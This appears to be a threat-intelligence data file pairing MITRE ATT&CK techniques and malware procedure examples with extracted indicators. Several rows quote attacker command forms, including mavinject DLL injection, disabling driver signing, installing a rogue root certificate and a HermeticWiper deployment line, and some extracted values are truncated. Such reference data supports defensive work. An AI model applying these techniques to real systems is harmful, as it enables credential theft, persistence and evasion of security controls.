T1546.012,Image File Execution Options Injection,SUNBURST  created an Image File Execution Options (IFEO) Debugger registry value for the process  dllhost.exe  to trigger the installation of  Cobalt Strike .   [10],Procedure Examples,file,dllhost.exe
T1546.012,Image File Execution Options Injection,TEMP.Veles  has modified and added entries within  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options  to maintain persistence.   [11],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
T1003.001,LSASS Memory,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct  Lateral Movement  using  Use Alternate Authentication Material .   As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.   For example, on the target host use procdump:   Locally, mimikatz can be run using:   Built-in Windows tools such as comsvcs.dll can also be used:   Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys:  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.   [3]      The following SSPs can be used to access credentials:",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security
T1003.001,LSASS Memory,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct  Lateral Movement  using  Use Alternate Authentication Material .   As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.   For example, on the target host use procdump:   Locally, mimikatz can be run using:   Built-in Windows tools such as comsvcs.dll can also be used:   Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys:  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.   [3]      The following SSPs can be used to access credentials:",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security
T1003.001,LSASS Memory,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct  Lateral Movement  using  Use Alternate Authentication Material .   As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.   For example, on the target host use procdump:   Locally, mimikatz can be run using:   Built-in Windows tools such as comsvcs.dll can also be used:   Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys:  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.   [3]      The following SSPs can be used to access credentials:",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security
T1003.001,LSASS Memory,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct  Lateral Movement  using  Use Alternate Authentication Material .   As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.   For example, on the target host use procdump:   Locally, mimikatz can be run using:   Built-in Windows tools such as comsvcs.dll can also be used:   Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys:  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.   [3]      The following SSPs can be used to access credentials:",Description,file,comsvcs.dll
T1003.001,LSASS Memory,"APT3  has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument ""dig.""   [9]",Procedure Examples,file,lsass.exe
T1003.001,LSASS Memory,Magic Hound  has stolen domain credentials by dumping LSASS process memory with comsvcs.dll and from a Microsoft Active Directory Domain Controller using  Mimikatz .   [49]      [50],Procedure Examples,file,comsvcs.dll
T1003.001,LSASS Memory,MuddyWater  has performed credential dumping with  Mimikatz  and procdump64.exe.   [55]      [56]      [57],Procedure Examples,file,procdump64.exe
T1003.001,LSASS Memory,"PoetRAT  used voStro.exe, a compiled pypykatz (Python version of  Mimikatz ), to steal credentials.   [67]",Procedure Examples,file,voStro.exe
T1003.001,LSASS Memory,Silence  has used the Farse6.1 utility (based on  Mimikatz ) to extract credentials from lsass.exe.   [75],Procedure Examples,file,lsass.exe
T1218.013,Mavinject,"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).   [1]      Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e.  Dynamic-link Library Injection ), allowing for arbitrary code execution (ex.  C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL ).   [2]      [3]    Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process.    In addition to  Dynamic-link Library Injection , Mavinject.exe can also be abused to perform import descriptor injection via its   /HMODULE  command-line parameter (ex.  mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER ). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.   [4]",Description,path,C:\Windows\system32\mavinject.exe
T1218.013,Mavinject,"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).   [1]      Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e.  Dynamic-link Library Injection ), allowing for arbitrary code execution (ex.  C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL ).   [2]      [3]    Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process.    In addition to  Dynamic-link Library Injection , Mavinject.exe can also be abused to perform import descriptor injection via its   /HMODULE  command-line parameter (ex.  mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER ). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.   [4]",Description,file,mavinject.exe
T1218.013,Mavinject,"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).   [1]      Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e.  Dynamic-link Library Injection ), allowing for arbitrary code execution (ex.  C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL ).   [2]      [3]    Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process.    In addition to  Dynamic-link Library Injection , Mavinject.exe can also be abused to perform import descriptor injection via its   /HMODULE  command-line parameter (ex.  mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER ). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.   [4]",Description,file,Mavinject.exe
T1555.003,Credentials from Web Browsers,PoetRAT  has used a Python tool named Browdec.exe to steal browser credentials.   [71],Procedure Examples,file,Browdec.exe
T1486,Data Encrypted for Impact,"XCSSET  performs AES-CBC encryption on files under  ~/Documents ,  ~/Downloads , and ~/Desktop  with a fixed key and renames files to give them a  .enc  extension. Only files with sizes less than 500MB are encrypted.   [73]",Procedure Examples,path,"~/Documents ,  ~/Downloads , and ~/Desktop  with a fixed key and renames files to give them a  .enc"
T1037.004,RC Scripts,HiddenWasp  installs reboot persistence by adding itself to  /etc/rc.local .   [2],Procedure Examples,path,/etc/rc.local
T1553.006,Code Signing Policy Modification,"Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system.    Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.   [1]      [2]    Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.   [3]      [2]      Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities,  Modify Registry , rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.   [4]      [2]      [5]      [6]    Examples of commands that can modify the code signing policy of a system include  bcdedit.exe -set TESTSIGNING ON  on Windows and  csrutil disable  on macOS.   [4]      [2]    Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.   [7]      To gain access to kernel memory to modify variables related to signature checks, such as modifying  g_CiOptions  to disable Driver Signature Enforcement, adversaries may conduct  Exploitation for Privilege Escalation  using a signed, but vulnerable driver.   [8]      [6]",Description,file,bcdedit.exe
T1553.006,Code Signing Policy Modification,Pandora  can use CVE-2017-15303 to disable Windows Driver Signature Enforcement (DSE) protection and load its driver.   [10],Procedure Examples,cve,CVE-2017-15303
T1069.003,Cloud Groups,"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.   With authenticated access there are several tools that can be used to find permissions groups. The  Get-MsolRole  PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts    [1]      [2]   .   Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command  az ad user get-member-groups  will list groups associated to a user account for Azure while the API endpoint  GET https://cloudidentity.googleapis.com/v1/groups  lists group resources available to a user for Google.   [3]      [4]      [5]      Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS  GetBucketAcl  API    [6]   . Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",Description,url,https://cloudidentity.googleapis.com/v1/groups
T1069.003,Cloud Groups,"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.   With authenticated access there are several tools that can be used to find permissions groups. The  Get-MsolRole  PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts    [1]      [2]   .   Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command  az ad user get-member-groups  will list groups associated to a user account for Azure while the API endpoint  GET https://cloudidentity.googleapis.com/v1/groups  lists group resources available to a user for Google.   [3]      [4]      [5]      Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS  GetBucketAcl  API    [6]   . Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",Description,domain,cloudidentity.googleapis.com
T1547.003,Time Providers,"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.   [1]    W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.   [2]      Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of   HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\ .   [2]    The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.   [2]      Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.   [3]",Description,registry-key,HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders
T1553.004,Install Root Certificate,Hikit  uses  certmgr.exe -add GlobalSign.cer -c -s -r localMachine Root  and  certmgr.exe -add GlobalSign.cer -c -s -r localMachineTrustedPublisher  to install a self-generated certificate to the local trust store as a root CA and Trusted Publisher.   [9],Procedure Examples,file,certmgr.exe
T1059.003,Windows Command Shell,Action RAT  can use  cmd.exe  to execute commands on an infected host.   [4],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,adbupd  can run a copy of cmd.exe.   [5],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Anchor  has used cmd.exe to run its self deletion routine.   [9],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,APT18  uses cmd.exe to execute commands on the victim’s machine.   [11]      [12],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,An  APT28  loader Trojan uses a cmd.exe and batch script to run its payload.   [13]    The group has also used macros to execute payloads.   [14]      [15]      [16]      [17],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,APT29  used  cmd.exe  to execute commands on remote machines.   [18]      [19],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,"An  APT3  downloader uses the Windows command  ""cmd.exe"" /C whoami . The group also uses a tool to execute commands on remote computers.   [20]      [21]",Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,APT32  has used cmd.exe for execution.   [22],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,APT41  used  cmd.exe /c  to execute commands on remote machines.   [26]    APT41  used a batch file to install persistence for the  Cobalt Strike  BEACON loader.   [27],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,AuTo Stealer  can use  cmd.exe  to execute a created batch file.   [4],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,BabyShark  has used cmd.exe to execute commands.   [33],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,BADNEWS  is capable of executing commands via cmd.exe.   [36]      [37],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Bazar  can launch cmd.exe to perform reconnaissance commands.   [42]      [43],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Bisonal  has launched cmd.exe and used the ShellExecuteW() API function to execute commands on the system.   [45]      [46]      [47],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,BlackMould  can run cmd.exe with parameters.   [49],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,BLINDINGCAN  has executed commands via cmd.exe.   [50],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,BONDUPDATER  can read batch commands in a file sent from its C2 server and execute them with cmd.exe.   [52],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Bumblebee  can use  cmd.exe  to drop and run files.   [55]      [56],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,"During  C0015 , the threat actors used  cmd.exe  to execute commands and run malicious binaries.   [57]",Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,CALENDAR  has a command to run cmd.exe to execute commands.   [44],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,ccf32  has used  cmd.exe  for archiving data and deleting files.   [62],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Clambling  can use cmd.exe for command execution.   [69],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Clop  can use cmd.exe to help execute commands on the system.   [70],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Cobalt Group  has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands.   [72]    The group has used an exploit toolkit known as Threadkit that launches .bat files.   [73]      [74]      [75]      [72]      [76]      [77],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,ComRAT  has used  cmd.exe  to execute commands.   [84],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,A module in  CozyCar  allows arbitrary commands to be executed by invoking  C:\Windows\System32\cmd.exe .   [86],Procedure Examples,path,C:\Windows\System32\cmd.exe
T1059.003,Windows Command Shell,A module in  CozyCar  allows arbitrary commands to be executed by invoking  C:\Windows\System32\cmd.exe .   [86],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Cuba  has used  cmd.exe /c  and batch files for execution.   [88],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,DanBot  has the ability to execute arbitrary commands via  cmd.exe .   [89]      [90],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,DarkWatchman  can use  cmd.exe  to execute commands.   [94],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,DnsSystem  can use  cmd.exe  for execution.   [98],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Dtrack  has used  cmd.exe  to add a persistent service.   [103],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Egregor  has used batch files for execution and can launch Internet Explorer from cmd.exe.   [105]      [106],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Ember Bear  had used  cmd.exe  and Windows Script Host (wscript) to execute malicious code.   [107],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Emotet  has used cmd.exe to run a PowerShell script.    [109],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,EnvyScout  can use cmd.exe to execute malicious files on compromised hosts.   [111],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,FIN6  has used  kill.bat  script to disable security tools.   [118],Procedure Examples,file,kill.bat
T1059.003,Windows Command Shell,Flagpro  can use  cmd.exe  to execute commands received from C2.   [124],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Fox Kitten  has used cmd.exe likely as a password changing mechanism.   [126],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,FunnyDream  can use  cmd.exe  for execution on remote hosts.   [62],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,"During  FunnyDream , the threat actors used  cmd.exe  to execute the wmiexec.vbs script.   [62]",Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Gold Dragon  uses cmd.exe to execute commands for discovery.   [134],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Goopy  has the ability to use cmd.exe to execute commands passed from an Outlook C2 channel.   [22],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Gorgon Group  malware can use cmd.exe to download and execute payloads and to execute commands on the system.   [138],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,GreyEnergy  uses cmd.exe to execute itself in-memory.   [116],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,H1N1  kills and disables services by using cmd.exe.   [141],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,HARDRAIN  uses cmd.exe to execute  netsh commands.   [142],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,"HAWKBALL  has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line.   [143]",Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,HermeticWiper  can use  cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\temp\sys.tmp1 CSIDL_WINDOWS\policydefinitions\postgresql.exe 1&gt; \\127.0.0.1\ADMIN$\_1636727589.6007507 2&gt;&amp;1  to deploy on an infected system.   [146],Procedure Examples,ip-address,127.0.0.1
T1059.003,Windows Command Shell,HermeticWiper  can use  cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\temp\sys.tmp1 CSIDL_WINDOWS\policydefinitions\postgresql.exe 1&gt; \\127.0.0.1\ADMIN$\_1636727589.6007507 2&gt;&amp;1  to deploy on an infected system.   [146],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,HermeticWiper  can use  cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\temp\sys.tmp1 CSIDL_WINDOWS\policydefinitions\postgresql.exe 1&gt; \\127.0.0.1\ADMIN$\_1636727589.6007507 2&gt;&amp;1  to deploy on an infected system.   [146],Procedure Examples,file,postgresql.exe
T1059.003,Windows Command Shell,HermeticWizard  can use  cmd.exe  for execution on compromised hosts.   [146],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Higaisa  used  cmd.exe  for execution.   [149]      [150]      [151],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,HOPLIGHT  can launch cmd.exe to execute commands on the system.   [154],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,httpclient  opens cmd.exe on the victim.   [2],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,JCry  has used  cmd.exe  to launch PowerShell.   [162],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,JPIN  can use the command-line utility cacls.exe to change file permissions.   [5],Procedure Examples,file,cacls.exe
T1059.003,Windows Command Shell,Kasidet  can execute commands using cmd.exe.   [164],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Kazuar  uses cmd.exe to execute commands on the victim’s machine.   [165],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Kevin  can use a renamed image of  cmd.exe  for execution.   [167],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,KEYMARBLE  can execute shell commands using cmd.exe.   [170],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,KGH_SPY  has the ability to set a Registry key to run a cmd.exe command.   [171],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,KOCTOPUS  has used  cmd.exe  and batch files for execution.   [175],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,KONNI  has used cmd.exe to execute arbitrary commands on the infected host across different stages of the infection chain.   [177]      [178]      [179],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Lazarus Group  malware uses cmd.exe to execute commands on a compromised host.   [180]      [181]      [182]      [183]      [184]    A Destover-like variant used by  Lazarus Group  uses a batch file mechanism to delete its binaries from the system.   [185],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,LightNeuron  is capable of executing commands via cmd.exe.   [186],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,LookBack  executes the  cmd.exe  command.   [191],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,MarkiRAT  can utilize cmd.exe to execute commands in a victim's environment.   [197],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,MCMD  can launch a console process (cmd.exe) with redirected standard input and output.   [200],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Metamorfo  has used  cmd.exe /c  to execute files.   [208],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,"Meteor  can run  set.bat ,  update.bat ,  cache.bat ,  bcd.bat ,  msrun.bat , and similar scripts.   [209]",Procedure Examples,file,set.bat
T1059.003,Windows Command Shell,"Meteor  can run  set.bat ,  update.bat ,  cache.bat ,  bcd.bat ,  msrun.bat , and similar scripts.   [209]",Procedure Examples,file,update.bat
T1059.003,Windows Command Shell,"Meteor  can run  set.bat ,  update.bat ,  cache.bat ,  bcd.bat ,  msrun.bat , and similar scripts.   [209]",Procedure Examples,file,cache.bat
T1059.003,Windows Command Shell,"Meteor  can run  set.bat ,  update.bat ,  cache.bat ,  bcd.bat ,  msrun.bat , and similar scripts.   [209]",Procedure Examples,file,bcd.bat
T1059.003,Windows Command Shell,"Meteor  can run  set.bat ,  update.bat ,  cache.bat ,  bcd.bat ,  msrun.bat , and similar scripts.   [209]",Procedure Examples,file,msrun.bat
T1059.003,Windows Command Shell,Micropsia  creates a command-line shell using cmd.exe.   [210],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Milan  can use  cmd.exe  for discovery actions on a targeted system.   [90],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,MirageFox  has the capability to execute commands using cmd.exe.   [211],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Mis-Type  has used  cmd.exe  to run commands on a compromised host.   [212],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,More_eggs  has used cmd.exe for execution.   [215]      [216],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Mosquito  executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.   [217],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,"Mustang Panda  has executed HTA files via cmd.exe, and used batch scripts for collection.   [219]      [220]",Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,NavRAT  leverages cmd.exe to perform discovery techniques.   [223]     NavRAT  loads malicious shellcode and executes it in memory.   [223],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,NETWIRE  can issue commands using cmd.exe.   [226]      [227],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Nomadic Octopus  used  cmd.exe /c  within a malicious macro.   [230],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,OceanSalt  can create a reverse shell on the infected endpoint using cmd.exe.   [231]     OceanSalt  has been executed via malicious macros.   [231],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Okrum 's backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version.   [237],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,"During  Operation Honeybee , various implants used batch scripting and  cmd.exe  for execution.   [240]",Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,"During  Operation Wocao , threat actors spawned a new  cmd.exe  process to execute commands.   [241]",Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,OutSteel  has used  cmd.exe  to scan a compromised host for specific file extensions.   [107],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,PingPull  can use  cmd.exe  to run various commands as a reverse shell.   [247],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Pisloader  uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.   [248],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,PLAINTEE  uses cmd.exe to execute commands on the victim’s machine.   [249],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,PowerDuke  runs  cmd.exe /c  and sends the output to its C2.   [255],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,"Proxysvc  executes a binary on the system and logs the results into a temp file by using:  cmd.exe /c ""  &gt; %temp%\PM* .tmp 2&gt;&amp;1""  .   [185]",Procedure Examples,path,"/c ""  &gt; %temp%\PM* .tmp"
T1059.003,Windows Command Shell,"Proxysvc  executes a binary on the system and logs the results into a temp file by using:  cmd.exe /c ""  &gt; %temp%\PM* .tmp 2&gt;&amp;1""  .   [185]",Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Pteranodon  can use  cmd.exe  for execution on victim systems.   [129]      [256],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,PyDCrypt  has used  cmd.exe  for execution.   [257],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,QakBot  can use cmd.exe to launch itself and to execute multiple C2 commands.   [258]      [259]      [260],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,QUADAGENT  uses cmd.exe to execute scripts and commands on the victim’s machine.   [235],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Ragnar Locker  has used cmd.exe and batch scripts to execute commands.   [263],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Rancor  has used cmd.exe to execute commmands.   [249],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,RATANKBA  uses cmd.exe to execute commands.   [264]      [265],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,RCSession  can use  cmd.exe  for execution on compromised hosts.   [69],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,RDAT  has executed commands using  cmd.exe /c .   [266],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,RedLeaves  can receive and execute commands with cmd.exe. It can also provide a reverse shell.   [204]      [267],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Remexi  silently executes received commands with cmd.exe.   [269],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Revenge RAT  uses cmd.exe to execute commands and run scripts on the victim's machine.   [270],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,RGDoor  uses cmd.exe to execute commands on the victim’s machine.   [275],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,"Rising Sun  has executed commands using  cmd.exe /c ""&lt;command&gt; &gt; &lt;%temp%&gt;\AM&lt;random&gt;. tmp"" 2&gt;&amp;1 .   [276]",Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,RobbinHood  uses cmd.exe on the victim's computer.   [277],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,RTM  uses the command line and rundll32.exe to execute.   [280],Procedure Examples,file,rundll32.exe
T1059.003,Windows Command Shell,Ryuk  has used  cmd.exe  to create a Registry entry to establish persistence.   [281],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Saint Bot  has used  cmd.exe  and  .bat  scripts for execution.   [107],Procedure Examples,file,cmd.exe
T1059.003,Windows Command Shell,Sakula  calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup.  Sakula  also has the capability to invoke a reverse shell.   [282],Procedure Examples,file,cmd.exe
